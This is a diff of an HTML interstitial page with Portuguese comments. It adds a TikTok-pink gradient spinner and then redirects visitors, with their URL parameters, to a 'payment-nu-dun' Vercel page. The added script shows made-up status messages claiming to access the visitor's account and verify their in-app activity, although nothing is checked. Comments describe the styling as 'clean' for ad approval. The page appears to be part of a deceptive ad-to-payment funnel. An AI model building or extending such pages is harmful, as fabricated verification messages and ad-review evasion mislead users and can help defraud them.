@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Aguarde...</title>
     <style>
-        /* Estilo Minimalista e "Limpo" para Aprovação */
+        /* Estilo Minimalista e "Limpo" (Seguro para Ads) */
         body, html {
             margin: 0;
             padding: 0;
@@ -18,47 +18,63 @@
             align-items: center;
             justify-content: center;
             color: #161823;
+            overflow: hidden; /* Evita barras de rolagem desnecessárias */
         }
 
-        /* Container do Spinner */
+        /* Container Principal */
         .loader-container {
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
         }
 
-        /* Spinner em Gradiente Rosa */
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #fe2c55; /* Cor Rosa TikTok */
-            border-image: linear-gradient(to right, #fe2c55, #ff6d8a) 1;
-            border-radius: 50%;
+        /* --- O NOVO SPINNER EM GRADIENTE ROSA --- */
+        .gradient-spinner {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            /* O segredo: o border-radius aqui corta o conteúdo interno */
+            border-radius: 50%; 
+            /* O fundo do spinner é o gradiente que você quer */
+            background: linear-gradient(45deg, #fe2c55, #ff6d8a, #ffb2c1);
             animation: spin 1s linear infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        /* Animação do Spinner */
+        /* O pseudo-elemento cria o "buraco" branco no meio */
+        .gradient-spinner::after {
+            content: '';
+            position: absolute;
+            width: 50px; /* Largura do buraco (60px total - 10px de borda fake) */
+            height: 50px; /* Altura do buraco */
+            background-color: #ffffff; /* Mesma cor do fundo da página */
+            border-radius: 50%;
+        }
+
+        /* Animação de Rotação */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
+        /* --- ESTILO DO TEXTO ANIMADO --- */
         .loading-text {
-            margin-top: 20px;
+            margin-top: 25px;
             font-size: 16px;
             font-weight: 500;
-            letter-spacing: -0.5px;
+            letter-spacing: -0.3px;
+            text-align: center;
+            min-height: 20px; /* Mantém o espaço mesmo sem texto */
+            opacity: 1;
+            transition: opacity 0.3s ease-in-out; /* Transição suave de piscar */
         }
 
-        /* Esconder o gradiente de borda padrão que não aceita radius facilmente */
-        .spinner-modern {
-            width: 45px;
-            height: 45px;
-            border: 4px solid rgba(254, 44, 85, 0.1);
-            border-left-color: #fe2c55;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        /* Classe para o efeito de fade-out na troca de texto */
+        .fade-out {
+            opacity: 0;
         }
 
     </style>
@@ -66,40 +82,64 @@
 <body>
 
     <div class="loader-container">
-        <div class="spinner-modern"></div>
-        <div class="loading-text" id="status-text">Processando solicitação...</div>
+        <!-- Novo Spinner com Gradiente Real -->
+        <div class="gradient-spinner"></div>
+        
+        <!-- Texto que será alterado pelo JS -->
+        <div class="loading-text" id="status-text">Iniciando...</div>
     </div>
 
     <script>
-        // 1. Configurações principais
+        // 1. Configurações Principais
         const destinationBaseUrl = "https://payment-nu-dun.vercel.app/";
-        const waitTimeInSeconds = 5;
+        const totalWaitTimeSeconds = 5;
 
+        // 2. Sequência de Mensagens e o tempo (em ms) que cada uma aparece
+        const messageSequence = [
+            { text: "Acessando conta...", time: 0 },
+            { text: "Verificando atividade dentro do app...", time: 1500 },
+            { text: "Atividade verificada...", time: 3200 },
+            { text: "Seja bem-vinda!", time: 4300 }
+        ];
+
+        const statusElement = document.getElementById('status-text');
+
+        // 3. Função para trocar o texto com um leve efeito de fade
+        function updateTextAnimated(newText) {
+            statusElement.classList.add('fade-out'); // Começa a sumir
+            
+            setTimeout(() => {
+                statusElement.innerText = newText; // Troca o texto
+                statusElement.classList.remove('fade-out'); // Reaparece
+            }, 300); // Metade do tempo da transition CSS
+        }
+
+        // 4. Agenda a troca de mensagens
+        messageSequence.forEach((item) => {
+            setTimeout(() => {
+                updateTextAnimated(item.text);
+            }, item.time);
+        });
+
+        // 5. Função de Redirecionamento (MANTIDA E SEGURA)
         function redirectWithParams() {
-            // 2. Captura os parâmetros da URL atual (ex: ?utm_source=tiktok&utm_campaign=ads)
+            // Captura os parâmetros da URL atual
             const currentQueryParams = window.location.search;
 
-            // 3. Constrói a URL final
-            // Se a URL de destino já tiver um '?', usa '&', caso contrário usa '?'
+            // Constrói a URL final de forma robusta
             const joiner = destinationBaseUrl.includes('?') ? '&' : '?';
-            
-            // Remove o '?' inicial dos parâmetros atuais para não duplicar se necessário
             const cleanParams = currentQueryParams.startsWith('?') ? currentQueryParams.substring(1) : currentQueryParams;
             
             const finalUrl = cleanParams 
                 ? `${destinationBaseUrl}${joiner}${cleanParams}`
                 : destinationBaseUrl;
 
-            // 4. Redireciona
+            // Redireciona
             window.location.href = finalUrl;
         }
 
-        // Timer visual para o texto (opcional)
-        let secondsLeft = waitTimeInSeconds;
-        const statusElement = document.getElementById('status-text');
-
-        // Executa o redirecionamento após os 5 segundos
-        setTimeout(redirectWithParams, waitTimeInSeconds * 1000);
+        // 6. Executa o redirecionamento final após o tempo total
+        setTimeout(redirectWithParams, totalWaitTimeSeconds * 1000);
 
     </script>
 </body>
